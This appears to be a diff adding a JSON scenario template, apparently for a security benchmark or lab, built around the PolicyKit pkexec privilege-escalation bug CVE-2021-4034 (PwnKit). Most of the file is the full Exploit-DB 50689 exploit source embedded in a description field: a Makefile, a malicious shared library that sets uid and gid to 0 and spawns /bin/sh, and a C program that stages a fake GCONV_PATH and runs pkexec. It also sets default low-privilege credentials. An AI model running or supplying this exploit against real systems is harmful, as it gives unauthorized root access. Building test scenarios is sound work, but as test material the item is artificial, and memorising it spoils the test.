@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_50689",
+  "category": "A4_polkit",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: PolicyKit-1 0.105-31 - Privilege Escalation (CVE-2021-4034)\n\nExploit source code (50689.txt):\n```\n# Exploit Title: PolicyKit-1 0.105-31 - Privilege Escalation\n# Exploit Author: Lance Biggerstaff\n# Original Author: ryaagard (https://github.com/ryaagard)\n# Date: 27-01-2022\n# Github Repo: https://github.com/ryaagard/CVE-2021-4034\n# References: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n\n# Description: The exploit consists of three files `Makefile`, `evil-so.c` & `exploit.c`\n\n##### Makefile #####\n\nall:\n\tgcc -shared -o evil.so -fPIC evil-so.c\n\tgcc exploit.c -o exploit\n\nclean:\n\trm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so\n\n#################\n\n##### evil-so.c #####\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid gconv() {}\n\nvoid gconv_init() {\n    setuid(0);\n    setgid(0);\n    setgroups(0);\n\n    execve(\"/bin/sh\", NULL, NULL);\n}\n\n#################\n\n##### exploit.c #####\n\n#include <stdio.h>\n#include <stdlib.h>\n\n#define BIN \"/usr/bin/pkexec\"\n#define DIR \"evildir\"\n#define EVILSO \"evil\"\n\nint main()\n{\n    char *envp[] = {\n        DIR,\n        \"PATH=GCONV_PATH=.\",\n        \"SHELL=ryaagard\",\n        \"CHARSET=ryaagard\",\n        NULL\n    };\n    char *argv[] = { NULL };\n\n    system(\"mkdir GCONV_PATH=.\");\n    system(\"touch GCONV_PATH=./\" DIR \" && chmod 777 GCONV_PATH=./\" DIR);\n    system(\"mkdir \" DIR);\n    system(\"echo 'module\\tINTERNAL\\t\\t\\tryaagard//\\t\\t\\t\" EVILSO \"\\t\\t\\t2' > \" DIR \"/gconv-modules\");\n    system(\"cp \" EVILSO \".so \" DIR);\n\n    execve(BIN, argv, envp);\n\n    return 0;\n}\n\n#################\n```",
+  "cve": "CVE-2021-4034",
+  "exploitdb_id": "50689",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_50689",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
